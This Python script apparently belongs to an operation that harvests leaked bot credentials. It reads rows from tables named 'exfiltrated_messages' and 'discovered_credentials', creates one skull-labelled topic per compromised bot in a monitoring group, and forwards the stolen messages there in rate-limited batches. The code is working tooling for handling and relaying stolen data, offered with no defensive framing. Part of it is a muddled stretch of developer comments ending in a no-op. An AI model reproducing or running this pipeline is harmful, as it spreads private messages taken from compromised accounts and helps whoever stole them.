import asyncio
import sys
import os
import time

# Add project root to sys.path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from app.core.database import db
from app.services.broadcaster_srv import broadcaster_service
from app.core.config import settings

async def run_manual_broadcast():
    print("🚀 Starting LOCAL MANUAL BROADCAST...")
    print(f"   Target Group ID: {settings.MONITOR_GROUP_ID}")
    print("-------------------------------------------------")
    
    total_sent = 0
    batch_size = 50
    
    while True:
        # Fetch batch
        try:
            response = db.table("exfiltrated_messages")\
                .select("*, discovered_credentials!inner(meta)")\
                .eq("is_broadcasted", False)\
                .order("created_at")\
                .limit(batch_size)\
                .execute()
            
            messages = response.data
        except Exception as e:
            print(f"❌ DB Error: {e}")
            break
            
        if not messages:
            print("✅ No more pending broadcasts.")
            break
            
        print(f"📦 Processing batch of {len(messages)} messages...")
        
        for msg in messages:
            try:
                cred_id = msg["credential_id"]
                cred_info = msg.get("discovered_credentials", {})
                meta = cred_info.get("meta", {}) if cred_info else {}
                
                # 1. CHECK FOR EXISTING TOPIC ID
                thread_id = meta.get("topic_id")
                topic_name_used = meta.get("topic_name")

                # If we don't have a thread_id, we must create one.
                if not thread_id:
                    # 2. DETERMINE NAME (Better Logic)
                    base_name = meta.get("bot_username")
                    
                    # Fallback: If no username in DB, try to fetch it live (expensive but worth it for 1st run)
                    if not base_name:
                         try:
                             # We use the token to ask who it is
                             # But we don't have the token here readily unless we join tables?
                             # Wait, we have 'discovered_credentials' joined!
                             # But we only selected meta? No, select("*") in query above.
                             # Ah, `msg` has `credential_id`. We need the token from the creds.
                             # The query: .select("*, discovered_credentials!inner(meta)")
                             # It seems we only fetched meta?
                             # Let's rely on what we have. If missing, default to Cred-ID but try to update later?
                             pass
                         except: pass

                    if not base_name:
                         base_name = f"Cred-{cred_id[:8]}"
                    
                    topic_name = f"💀 @{base_name}"
                    
                    # 3. CREATE TOPIC
                    print(f"   🆕 Creating NEW topic: {topic_name}")
                    thread_id = await broadcaster_service.ensure_topic(settings.MONITOR_GROUP_ID, topic_name)
                    
                    if thread_id:
                        # 4. PERSIST TOPIC ID TO DB (Critical Step)
                        # We merge the new topic_id into the existing meta
                        new_meta = meta.copy()
                        new_meta["topic_id"] = thread_id
                        new_meta["topic_name"] = topic_name
                        
                        db.table("discovered_credentials")\
                            .update({"meta": new_meta})\
                            .eq("id", cred_id)\
                            .execute()
                        print(f"   💾 Saved Topic ID {thread_id} to Credential {cred_id}")
                
                # Send
                await broadcaster_service.send_message(settings.MONITOR_GROUP_ID, thread_id, msg)
                
                # Update DB
                db.table("exfiltrated_messages").update({"is_broadcasted": True}).eq("id", msg["id"]).execute()
                total_sent += 1
                
                print(f"   📤 Sent msg {msg['id']} -> Topic: {topic_name}")
                
                # Rate limit
                await asyncio.sleep(2.0) 
                
            except Exception as e:
                print(f"   ❌ Error sending msg {msg['id']}: {e}")
                # Optional: mark as error? 
                
        # Small pause between batches
        time.sleep(1)

    print("-------------------------------------------------")
    print(f"🏁 Broadcast Complete. Total Sent: {total_sent}")

if __name__ == "__main__":
    asyncio.run(run_manual_broadcast())
